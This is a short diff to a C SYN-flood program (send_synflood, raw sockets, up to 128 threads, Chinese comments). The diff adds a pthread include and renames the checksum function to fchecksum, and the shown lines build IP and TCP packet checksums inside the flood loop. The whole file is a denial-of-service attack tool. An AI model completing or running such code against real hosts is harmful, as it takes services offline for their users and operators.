@@ -19,10 +19,12 @@
 #include <stdlib.h>
 #include <time.h> 
 #include <arpa/inet.h>
+#include <pthread.h>
 
 /* 最多线程数 */
 #define MAXCHILD 128
 
+ 
 /* 原始套接字 */
 int sockfd;
 
@@ -67,8 +69,8 @@ struct pseudohdr
 };
 
 /* CRC16校验 */
-unsigned short inline
-checksum (unsigned short *buffer, unsigned short size)     
+unsigned short 
+fchecksum (unsigned short *buffer, unsigned short size)     
 {  
 
 	unsigned long cksum = 0;
@@ -157,7 +159,7 @@ send_synflood(struct sockaddr_in *addr)
 		//计算IP校验和
 		bzero(buf, sizeof(buf));
 		memcpy(buf , &ip, sizeof(struct ip));
-		ip.checksum = checksum((u_short *) buf, sizeof(struct ip));
+		ip.checksum = fchecksum((u_short *) buf, sizeof(struct ip));
 
 		pseudoheader.saddr = ip.sourceIP;
 
@@ -165,7 +167,7 @@ send_synflood(struct sockaddr_in *addr)
 		bzero(buf, sizeof(buf));
 		memcpy(buf , &pseudoheader, sizeof(pseudoheader));
 		memcpy(buf+sizeof(pseudoheader), &tcp, sizeof(struct tcphdr));
-		tcp.sum = checksum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct tcphdr));
+		tcp.sum = fchecksum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct tcphdr));
 
 		bzero(sendbuf, sizeof(sendbuf));
 		memcpy(sendbuf, &ip, sizeof(struct ip));
